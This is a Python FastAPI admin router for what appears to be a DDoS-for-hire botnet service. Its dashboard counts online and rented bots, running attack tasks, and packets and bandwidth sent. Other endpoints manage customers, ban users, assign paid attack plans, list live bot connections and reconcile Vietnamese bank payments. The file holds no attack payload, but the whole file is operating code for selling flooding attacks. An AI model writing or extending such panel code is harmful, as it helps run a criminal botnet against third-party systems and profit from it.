from fastapi import APIRouter, Depends, HTTPException
from typing import List, Optional
from uuid import UUID
from pydantic import BaseModel, Field
from app.auth import get_current_admin, hash_password
from app.models.all_models import User
from app.schemas.all_schemas import DashboardStats, UserOut
from app.database import async_session
from sqlalchemy import select, func
from app.models.all_models import Bot, AttackTask, User as UserModel, AdminLog, Plan, UserSubscription
from datetime import datetime, timezone, timedelta
import secrets

router = APIRouter(prefix="/api/admin", tags=["admin"])

class AdminCreateUser(BaseModel):
    username: str = Field(..., min_length=3, max_length=64)
    password: str = Field(..., min_length=6)
    email: Optional[str] = None
    role: str = Field(default="user", pattern="^(user|admin)$")

class AdminAssignPlan(BaseModel):
    plan_id: str
    days: int = Field(default=30, ge=1, le=365)

@router.get("/stats", response_model=DashboardStats)
async def get_stats(admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        tb = (await s.execute(select(func.count(Bot.id)))).scalar() or 0
        ob = (await s.execute(select(func.count(Bot.id)).where(Bot.status == "online"))).scalar() or 0
        rb = (await s.execute(select(func.count(Bot.id)).where(Bot.is_rented == True))).scalar() or 0
        aa = (await s.execute(select(func.count(AttackTask.id)).where(AttackTask.status == "running"))).scalar() or 0
        tu = (await s.execute(select(func.count(UserModel.id)))).scalar() or 0
        tp = (await s.execute(select(func.coalesce(func.sum(AttackTask.total_packets), 0)))).scalar() or 0
        tby = (await s.execute(select(func.coalesce(func.sum(AttackTask.total_bytes), 0)))).scalar() or 0
    return DashboardStats(total_bots=tb, online_bots=ob, rented_bots=rb, active_attacks=aa, total_users=tu, total_packets=tp, total_bandwidth_gb=round(tby/1e9,2))

@router.get("/users", response_model=List[UserOut])
async def list_users(admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        r = await s.execute(select(UserModel).order_by(UserModel.created_at.desc()))
        return [UserOut.model_validate(u) for u in r.scalars().all()]

@router.post("/users/{user_id}/ban")
async def ban_user(user_id: UUID, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        user = (await s.execute(select(UserModel).where(UserModel.id == user_id))).scalar_one_or_none()
        if not user: raise HTTPException(404, "User not found")
        user.is_banned = True; await s.commit()
        return {"status": "banned"}

@router.post("/users/{user_id}/unban")
async def unban_user(user_id: UUID, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        user = (await s.execute(select(UserModel).where(UserModel.id == user_id))).scalar_one_or_none()
        if not user: raise HTTPException(404, "User not found")
        user.is_banned = False; await s.commit()
        return {"status": "unbanned"}

@router.delete("/users/{user_id}")
async def delete_user(user_id: UUID, admin: User = Depends(get_current_admin)):
    if user_id == admin.id:
        raise HTTPException(400, "Cannot delete yourself")
    async with async_session() as s:
        user = (await s.execute(select(UserModel).where(UserModel.id == user_id))).scalar_one_or_none()
        if not user: raise HTTPException(404, "User not found")
        await s.delete(user)
        await s.commit()
        return {"status": "deleted"}

@router.get("/logs")
async def get_logs(limit: int = 100, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        r = await s.execute(select(AdminLog).order_by(AdminLog.created_at.desc()).limit(limit))
        return [{"id":l.id,"admin_id":str(l.admin_id),"action":l.action,"target_type":l.target_type,"target_id":str(l.target_id) if l.target_id else None,"details":l.details,"created_at":l.created_at.isoformat() if l.created_at else None} for l in r.scalars().all()]

@router.post("/users", response_model=UserOut)
async def create_user(data: AdminCreateUser, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        exists = (await s.execute(select(UserModel).where(UserModel.username == data.username))).scalar_one_or_none()
        if exists:
            raise HTTPException(409, "Username taken")
        user = UserModel(
            username=data.username,
            email=data.email,
            password_hash=hash_password(data.password),
            role=data.role,
            api_key=secrets.token_hex(24),
        )
        s.add(user)
        await s.commit()
        await s.refresh(user)
        return UserOut.model_validate(user)

@router.post("/users/{user_id}/plan")
async def assign_plan(user_id: UUID, data: AdminAssignPlan, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        user = (await s.execute(select(UserModel).where(UserModel.id == user_id))).scalar_one_or_none()
        if not user:
            raise HTTPException(404, "User not found")
        plan = (await s.execute(select(Plan).where(Plan.id == UUID(data.plan_id)))).scalar_one_or_none()
        if not plan:
            raise HTTPException(404, "Plan not found")
        # Deactivate old
        old = (await s.execute(select(UserSubscription).where(
            UserSubscription.user_id == user_id, UserSubscription.status == "active"
        ))).scalars().all()
        for o in old:
            o.status = "expired"
        sub = UserSubscription(
            user_id=user_id,
            plan_id=plan.id,
            status="active",
            expires_at=datetime.now(timezone.utc) + timedelta(days=data.days),
            payment_id=f"admin:{admin.id}",
        )
        s.add(sub)
        await s.commit()
        return {"status": "ok", "plan": plan.slug, "days": data.days}

@router.get("/ws/live")
async def ws_live(admin: User = Depends(get_current_admin)):
    from app.websocket.bot_handler import manager
    return {
        "connected": len(manager.active),
        "bot_ids": list(manager.active.keys()),
    }

@router.get("/payments")
async def payment_history(days: int = 7, admin: User = Depends(get_current_admin)):
    """MB Bank transaction history for payment troubleshooting."""
    from app.mbbank import get_mb
    from app.models.all_models import Payment
    mb = get_mb()
    results = []
    try:
        txs = await mb.get_transactions(days=days)
    except Exception:
        txs = []

    # Also get DB payment records
    async with async_session() as s:
        r = await s.execute(
            select(Payment).order_by(Payment.created_at.desc()).limit(200)
        )
        db_payments = []
        for p in r.scalars().all():
            db_payments.append({
                "id": str(p.id),
                "user_id": str(p.user_id),
                "amount": p.amount_vnd or 0,
                "currency": "VND",
                "status": p.status,
                "description": p.tx_ref or "",
                "tx_id": p.tx_ref or "",
                "method": p.method or "",
                "created_at": p.created_at.isoformat() if p.created_at else None,
            })

    return {
        "mb_transactions": txs,
        "db_payments": db_payments,
    }